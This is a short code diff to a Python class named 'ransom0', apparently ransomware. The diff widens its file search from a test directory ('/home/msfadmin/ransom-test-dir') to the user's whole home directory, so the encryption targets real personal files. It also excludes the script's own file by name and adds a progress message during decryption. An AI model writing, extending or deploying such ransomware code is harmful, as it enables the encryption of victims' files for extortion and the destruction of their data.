@@ -93,13 +93,12 @@ class ransom0:
     def FindFiles(self):
         f = open("logs/path.txt", "w")
         cnt = 0
-        #for root, dirs, files in os.walk("/"):
-        for root, dirs, files in os.walk("/home/msfadmin/ransom-test-dir"):
+        for root, dirs, files in os.walk(path.expanduser('~')):
             if any(s in root for s in self.EXCLUDE_DIRECTORY):
                 pass
             else:
                 for file in files:
-                    if file.endswith(__file__):
+                    if file.endswith('ransom0.py'):
                         continue
 
                     if file.endswith(self.EXTENSIONS):
@@ -181,6 +180,7 @@ def DECRYPT_FILE():
         while line:
             filename = line.strip()
             try:
+                print('Decrypting {}'.format(filename))
                 decrypt(filename)
             except PermissionError:
                 print("!Permission Denied")
